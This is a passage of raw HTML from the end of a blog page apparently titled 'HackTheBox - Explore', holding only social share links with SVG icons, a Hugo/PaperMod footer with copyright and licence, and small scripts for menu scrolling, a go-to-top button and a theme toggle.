62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Explore on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Explore%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fexplore%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Explore on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Explore&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fexplore%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>